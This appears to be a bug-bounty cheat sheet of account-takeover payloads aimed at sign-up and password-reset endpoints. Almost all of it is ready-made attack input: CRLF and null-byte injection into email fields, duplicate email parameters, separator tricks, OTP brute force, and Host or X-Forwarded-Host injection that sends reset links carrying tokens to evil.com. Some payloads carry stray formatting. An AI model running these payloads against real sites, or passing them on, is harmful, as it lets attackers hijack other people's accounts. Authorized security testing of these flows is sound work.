## Through Email Replacing when Registering Account (testing/abuse email filter)

```
email@email.com,victim@hack.secry
email@email“,”victim@hack.secry
email@email.com:victim@hack.secry
email@email.com%0d%0avictim@hack.secry
%0d%0avictim@hack.secry
%0avictim@hack.secry
victim@hack.secry%0d%0a
victim@hack.secry%0a
victim@hack.secry%0d
victim@hack.secry%00
victim@hack.secry{{}}

Example Request:

name=HACKER&email=HACKER@wearehackerone.com&email=victim@hack.secry&username=hackerz&password=THIS_ISPASSWORD_TO_TAKEOVER&password-confirmation=THIS_ISPASSWORD_TO_TAKEOVER&_csrf_token=XXX7139a5209c08aec2dbff06f5ab5XXXXXXXXXX
```

## Through Parameter Pollution in Reset Password

```
POST /passwordReset  
[…]  
email=victim@yahoo.com&email=hacker@yahoo.com

or in JSON:
{“email”:[“andrew@hotmail.com”,”hacker@gmail.com”]}
```

## Through OTP Code Bruteforce

```
POST /reset  
[…]  
email=victim@mail.com&code=$12345$

u can use burp intruder
```

## Through Host Header Injection

```
POST /reset  
Host: evilsite.com  
[…]  
email=victim@mail.com
------------------------------------------------------------------------
POST /reset  
Host: target.com  
X-Forwarded-Host: evil.com  
[…]  
email=victim@mail.com
```
And the victim will receive the **reset link** email with with “**token**” will contain “**evilsite.com**“, so when the user click the link, the “token” will logged/extracted to the evilsite.com server log

## Using Separator in Value of the Parameter

```
POST /PWreset  
[…]  
email=victim@mail.com**,**hacker@mail.com
----------------------------------------------------------------------------------
POST /PWreset  
[…]  
email=victim@mail.com**%20**hacker@mail.com
----------------------------------------------------------------------------------
POST /PWreset  
[…]  
email=victim@mail.com**|**hacker@mail.com
----------------------------------------------------------------------------------
POST /PWreset  
[…]  
email=victim@mail.com**%00**hacker@mail.com
```

## Try input No Domain in Value of the Parameter to Account Takeover

```
POST /registeraccount  
[…]  
email=victimemail
```

## Try input No TLD in Email Value of the Parameter

```
POST /reset  
[…]  
email=victimemail@mail.secry
----------------------------------------------------------------------------------
POST /reset  
[…]  
[email=victim@mail.com%0a%0dcc:hacker@secry.me](https://email%3Dvictim%40mail.com%0a%0dcc:hacker@secry.me/)
```

## Try Re-Sign up using Same Email

```
POST /newaccount  
[…]  
email=victim@secry.me&password=1234

After sign up using victim email, try signup again but using different password

POST /newaccount  
[…]  
email=victim@secry.me&password=yourehacked
```

## If there is JSON data in requests, add comma and input your hacker email

```
POST /newaccount  
[…]  
{“email”:“[victim@mail.com](mailto:victim@mail.com)”,”[hacker@secry.me](mailto:hacker@secry.me)”,“token”:”xxxxxxxxxx”}
```
